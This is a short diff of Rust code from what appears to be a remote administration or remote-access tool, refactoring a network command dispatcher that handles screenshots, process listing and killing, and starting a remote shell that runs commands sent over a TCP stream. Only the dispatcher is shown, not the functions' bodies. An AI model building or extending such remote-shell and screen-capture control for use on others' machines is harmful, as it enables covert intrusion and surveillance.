@@ -17,10 +17,7 @@ pub fn handle_command(write_stream: &mut TcpStream, command: &str, command_data:
         "SCREENSHOT" => take_screenshot(write_stream, command_data.parse::<i32>().unwrap()),
         "PROCESS_LIST" => process_list(write_stream),
         "KILL_PROCESS" => kill_process(command_data.parse::<usize>().unwrap()),
-        "START_SHELL" => {
-            let shared_stream = Arc::new(Mutex::new(write_stream.try_clone().expect("Failed to clone TcpStream")));
-            start_shell(shared_stream, remote_shell)
-        },
+        "START_SHELL" => start_shell(Arc::new(Mutex::new(write_stream.try_clone().expect("Failed to clone TcpStream"))), remote_shell),
         "EXIT_SHELL" => exit_shell(remote_shell),
         "SHELL_COMMAND" => execute_shell_command(remote_shell, command_data),
         "MANAGE_SYSTEM" => system_commands(command_data),
